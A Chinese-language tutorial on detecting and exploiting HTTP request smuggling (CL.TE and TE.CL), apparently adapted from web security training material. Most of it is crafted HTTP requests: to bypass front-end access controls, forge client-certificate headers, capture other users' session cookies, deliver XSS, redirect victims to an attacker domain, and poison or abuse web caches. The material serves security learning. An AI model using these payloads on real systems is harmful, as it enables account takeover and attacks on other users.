如何寻找HTTP请求走私漏洞

1.使用计时技术

因为前后端采用的标头不同以及前端仅转发请求的一部分，而在后端处理数据包的时候在等待其余内容或者块到达的时候会导致明显的时间延迟

使用计时技术寻找CL.TE漏洞

如果一个应用程序容易收到CL.TE漏洞的攻击，那么我们发送一个如下的请求就可以造成时间延迟

POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X

由于CL.TE漏洞前端优先检测CL头，前端服务器将把

1
A

优先发送给后端服务器，将X滞留与pipline中，那么下一个请求发送过来时，将会与X进行组合

XGET /search HTTP/1.1
...
...

将会导致404，可以检测存在CL.TE漏洞

使用计时技术寻找TE.CL漏洞

如果应用程序存在TE.CL漏洞，那么我们发送如下请求：

POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X

前端优先检测TE：chunked， TE检测到0\r\n\r\n认为请求已经结束，后续X存入pipline中，与后续请求拼接在一起导致如下请求：

XPOST / HTTP/1.1
...
...

返回404，存在TE.CL漏洞

！注意：应该先进行CL.TE的测试，再进行TE.CL的测试，因为TE.CL会中断其他用户的请求，导致网站出问题

2.查分响应技术

当检测到可能的请求走私漏洞时，可以通过利用该漏洞触发响应内容的差异来获得该漏洞的进一步证据。这涉及快速连续地向应用发送两个请求：

· 一个意在干扰下一个正常请求的走私请求

·一个正常请求

如果对相应包含了预期的干扰，则确认有这个漏洞

比如这是一个普通的请求：

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling

这个请求包含了HTTP返回包的200状态码和一些被搜索到的内容

基于差分相应技术的CL.TE漏洞

为了去确定CL.TE漏洞，我们可以这样构建一个数据包：

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x

如果攻击成功执行，前端根据CL确认，则将所有的数据都发送给后端，后端根据TE确认，TE识别到0\r\n\r\n,则将GET /404保存在pipline中，当后续请求传递过来时，将会与之进行拼接

GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling

由于包含了一个空的URL，那么网站就会返回404

基于差分相应技术的TE.CL漏洞

首先我们构建一个类似如下的数据包：

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0

由于前端根据TE进行确认，那么将会把整个数据包传输到后端，后端根据CL进行确认，CL长度为4，那么后端将会只保存\r\n7c四个字节，将后续的GET放入pipline中进行等待。

！注意：在测试TE.CL漏洞时，需要关闭burpsuite中的Update Content-Length，否则它会自动帮你识别长度并进行发送。

如果攻击成功，则后端服务器会拼接如下请求：

GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 146

x=
0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling

后端会将x=后面都当成请求体，导致后端服务器访问/404，从而造成漏洞

Note！

在尝试通过干扰其他请求来确认请求走私漏洞时，应牢记以下重要的注意事项：

  1. 攻击请求和正常请求应该适用不同的网络发送到服务器，比如一个用chrome的正常模式，一个用chrome的隐私模式发送，如果通过同一个链接发送这两个请求，不能保证漏洞一定存在
  2. 攻击请求和正常请求应该尽可能的使用相同的URL和参数名称。这是因为现代的程序会根据URL和参数将前端请求路由到不同的后端服务器，使用相同的URL和参数会增加请求由同一个后端服务器处理的机会
  3. 在测试正常请求以检测来自攻击请求的干扰时，可能会被其他请求造成干扰，所以应该进行多次测试，并且当你发送恶意请求时，应立即发送下一个请求以防止正常其他用户请求的干扰
  4. 如果前端服务器充当了负载均衡器，并根据一些负载均衡算法将请求转发到不同的后端系统，那么就会攻击失败，这也是需要发送多次请求尝试的原因之一
  5. 如果成功干扰了后续请求，但不是预期检测干扰而发送的请求，那么可能意味着其他正常用户收到了攻击影响，如果继续执行测试，可能会对其他用户造成破坏性的影响

http请求走私利用方式：

  1. 绕过前端安全控制
  2. 现实前端请求重写
  3. 捕获其他用户的请求
  4. 利用反射型XSS
  5. 重定向
  6. 执行web缓存中毒
  7. 执行web缓存欺骗
  8. 绕过waf和CDN

使用HTTP走私请求绕过前端安全控制

在一些应用中，前段服务器会使用一些安全控制实例去决定是否允许请求通过，如果后端接收到请求，则默认为该请求通过了前端安全控制

例如，假设应用程序使用前端服务器来实现访问控制限制，仅当用户有权访问请求的 URL 时才转发请求。然后，后端服务器会接受每个请求，而无需进一步检查。在此情况下，HTTP 请求走私漏洞可用于绕过访问控制，方法是将请求走私到受限制的 URL。

假设当前用户允许访问/home页面但是不能访问/admin页面，我们可以尝试用如下请求去绕过：

POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: xGET /home HTTP/1.1
Host: vulnerable-website.com

Revealing front-end request rewriting

在一些应用中，前端服务器在转发到后端服务器时进行请求重写，一般来说是加一些请求头，例如前端服务器也许会加：

  • 终止TLS连接并添加一些请求头来描述所使用的协议和加密方式
  • 添加一个X-Forwarded-For请求头来包含用户的IP地址
  • 根据用户的session token值来确定用户的ID，并添加一些请求头来标识用户
  • 添加一些对其他攻击者可能会感兴趣的敏感信息

在某些情况下，如果走私请求的payload缺少一些前端服务器主动添加的请求头，那么后端服务器可能无法正常处理请求，导致走私请求无法达到预期的效果。

有一种比较简单的方法可以准确地揭示前端服务器如何重写请求。为此，我们需要执行以下步骤：

  • 查找将请求参数的值反映到应用程序响应中的 POST 请求。
  • 随机排列参数，使反射的参数显示在消息正文的最后。
  • 将此请求走私到后端服务器，然后直接发送一个想要显示其重写形式的普通请求。

例如当一个程序有一个登录函数可以反射email参数的值

POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

email=wiener@normal-user.net

当我们将这个请求发送给后端服务器，那么response包中将会包含以下结果：

<input id="email" value="wiener@normal-user.net" type="text">

那么我们就可以根据response包中的结果来构造我们的paylaod，如下：

POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

email=POST /login HTTP/1.1
Host: vulnerable-website.com
...

前端服务器将重写请求以包含其他请求头，然后后端服务器将处理走私的请求，并将重写的第二个请求视为 email 参数的值。然后，它将在对第二个请求的响应中反映这个值，通俗理解就是将email=后面的邮箱值改成一个和原来相同的请求，这样后端服务器就会讲本来应该显示email的地方显示出钱端服务器添加的请求头

<input id="email" value="POST /login HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-For: 1.3.3.7
X-Forwarded-Proto: https
X-TLS-Bits: 128
X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256
X-TLS-Version: TLSv1.2
x-nr-external-service: external
...

!Note

由于最终请求正在重写，因此我们不知道它最终会持续多长时间。走私请求中内容长度请求头中的值将确定后端服务器认为该请求的长度。如果将此值设置得太短，则只会收到重写请求的一部分;如果设置得太长，后端服务器将超时等待请求完成。当然，解决方案是猜测一个比提交的请求大一点的初始值，然后逐渐增加该值以检索更多信息，直到拥有所有敏感信息位置。

Bypassing client authentication

作为 TLS 握手的一部分，服务器通过提供证书向客户端（通常是浏览器）验证自己的身份。此证书包含其“公用名”Common Name（CN），该名称应与其注册的主机名匹配。然后，客户端可以使用它来验证它们是否正在与属于预期域的合法服务器通信。

然而一些站点进一步实现了一种相互 TLS 身份验证（mTLS）形式，其中客户端还必须向服务器提供证书。在这种情况下，客户端的 CN 通常是用户名等，例如，它可以在后端应用程序逻辑中用作访问控制机制的一部分。

验证客户端的组件通常通过一个或多个非标准 HTTP 请求头将证书中的相关详细信息传递给应用程序或后端服务器。例如，前端服务器有时会在任何传入请求中附加一个包含客户端 CN 的标头：

GET /admin HTTP/1.1
Host: normal-website.com
X-SSL-CLIENT-CN: carlos

由于这些请求头应该对用户完全隐藏，因此它们通常被后端服务器隐式信任。假设我们能够发送标头和值的正确组合，这可能使我们能够成功绕过访问控制。

然而在实践中，这种行为通常不可利用，因为前端服务器倾向于覆盖这些标头（如果它们已经存在）。但是，走私的请求完全对前端隐藏，因此它们包含的任何标头都将原封不动地发送到后端。例如可以尝试如下利用方法，但是首先我们需要通过上面的请求重写来获取请求头

POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 64
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-SSL-CLIENT-CN: administrator
Foo: x

Capturing other users’ requests

如果应用程序包含允许存储和检索文本数据的任何类型的功能，则可以使用HTTP请求走私来捕获其他用户请求的内容。这些可能包括会话令牌，启用会话劫持攻击或用户提交的一些其他敏感数据。用作此payload的合适功能是评论，电子邮件，个人资料描述，屏幕名称等。

要执行攻击，首先需要走私一个向存储函数提交数据的请求，参数包含位于请求中最后的数据。后端服务器处理的下一个请求将附加到走私请求中，结果存储了其他用户的原始请求。

假设应用程序使用以下请求来提交博客文章的评论，该评论将被存储并显示在博客上：

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 154
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&comment=My+comment&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net

我们可以尝试执行以下请求走私攻击，将数据存储请求走私到后端服务器：

GET / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 324

0

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=

当后端服务器处理其他用户的请求时，它将被附加到走私请求中（Comment=xxxx），结果是用户的请求被存储，包括受害者用户的会话cookie和任何其他敏感数据：

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=GET / HTTP/1.1
Host: vulnerable-website.com
Cookie: session=jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj
...

然后，您可以通过以正常方式检索存储的数据来检索其他用户请求的详细信息。

Using HTTP request smuggling to exploit reflected XSS

如果一个应用程序容易受到HTTP请求走私并且还存在反射型XSS，您可以使用请求走私攻击来攻击该应用程序的其他用户。这种方法在两个方面优于对普通反射型XSS的正常利用：

  • 它不需要与受害者进行交互。无需向受害者提供URL并等待受害者访问恶意网址。而是只需走私一个包含XSS有效负载的请求，后端服务器处理的下一个用户请求就会被命中。
  • 它可用于利用在正常反射XSS攻击中无法轻松控制的请求部分中的XSS行为，例如HTTP请求请求头。

例如，假设应用程序在User-Agent标头中存在反射XSS漏洞。您可以在请求走私攻击中利用它，如下所示：

POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 63
Transfer-Encoding: chunked

0

GET / HTTP/1.1
User-Agent: <script>alert(1)</script>
Foo: X

下一个用户的请求将附加到走私的请求中，该用户将在响应中收到反射型XSS payload。

Using HTTP request smuggling to turn an on-site redirect into an open redirect

许多应用程序执行从一个 URL 到另一个 URL 的重定向，并将主机名从请求的 Host 标头放入重定向 URL 中。这方面的一个例子是Apache和IIS Web服务器的默认行为，其中对无论是否具有尾部斜杠的文件夹的请求会收到重定向到同一文件夹：

GET /home HTTP/1.1
Host: normal-website.com

HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/

这种行为通常来说被认为是没有影响的，但可以在请求走私攻击中利用它来将其他用户重定向到外部域。例如：

POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X

走私请求将触发指向攻击者网站的重定向，这将影响后端服务器处理的下一个用户的请求。我们可以将受害者所访问的域名换成我们自己的攻击域名，例如下一个用户的请求到达后将与我们的内容进行拼接：

GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/

用户的请求是一个由网站页面导入的 JavaScript 文件。攻击者可以通过在响应中返回他们自己的 JavaScript来完全控制受害者

Turning root-relative redirects into open redirects

在某些情况下，我们可能会遇到使用路径为 Location 标头构造根相对 URL 的服务器级重定向，例如：

GET /example HTTP/1.1
Host: normal-website.com

HTTP/1.1 301 Moved Permanently
Location: /example/

如果服务器允许我们在路径中使用相对于协议的 URL，这大概率仍然可用于开放重定向：

GET //attacker-website.com/example HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 301 Moved Premanently
Location: //attacker-website.com/example/

例如我们将Location后指向我们的攻击域名，仍然可以通过JavaScript来进行控制

**Using HTTP request smuggling to perform web cache poisoning

在上述攻击的变体中，可能会利用 HTTP 请求走私来执行 Web 缓存中毒攻击。如果前端基础架构的任何部分执行内容缓存（通常来说是出于性能原因），则可能会使用异地重定向响应毒害缓存。这将使攻击持续存在，影响随后请求受影响 URL 的任何用户。

例如攻击者可以发送如下数据包到前端服务器：

POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 59
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /static/include.js HTTP/1.1
Host: vulnerable-website.com

当请求走私到后端服务器时，后端服务器会像以前一样使用异地重定向进行响应。前端服务器根据它认为是第二个请求中的 URL 缓存此响应，即 /static/include.js：

GET /static/include.js HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/

从这个时候开始，当其他用户请求此 URL 时，他们都会收到指向攻击者网站的重定向。

Using HTTP request smuggling to perform web cache deception

我们也可以利用HTTP请求走私来执行Web缓存欺骗。其工作方式与 Web 缓存中毒攻击类似，但目的不同。

1.在 Web 缓存中毒中，攻击者使应用程序在缓存中存储一些恶意payload，并将这些内容从缓存中提供给其他应用程序用户。

2.在网络缓存欺骗中，攻击者使应用程序将属于另一个用户的一些敏感内容存储在缓存中，然后攻击者从缓存中检索这些内容。

在这种攻击中，攻击者走私一个请求，该请求返回一些敏感的用户特定内容。例如：

POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 43
Transfer-Encoding: chunked

0

GET /private/messages HTTP/1.1
Foo: X

转发到后端服务器的其他用户的下一个请求将attach到走私请求中，包括会话 Cookie 和其他请求头。例如：

GET /private/messages HTTP/1.1
Foo: XGET /static/some-image.png HTTP/1.1
Host: vulnerable-website.com
Cookie: sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z
...

后端服务器以正常方式响应此请求。请求中的 URL 用于用户的私人消息，请求在受害者用户会话的上下文中进行处理。前端服务器根据它认为是第二个请求中的 URL（即 /static/some-image）缓存此响应.png：

GET /static/some-image.png HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 200 Ok
...
<h1>Your private messages</h1>
...

然后，攻击者访问静态 URL 并接收从缓存返回的敏感内容。

这里有一个重要的警告，攻击者不知道将缓存敏感内容的URL，因为这将是受害者用户在走私请求生效时碰巧请求的任何URL。攻击者可能需要获取大量静态 URL 才能发现捕获的内容。
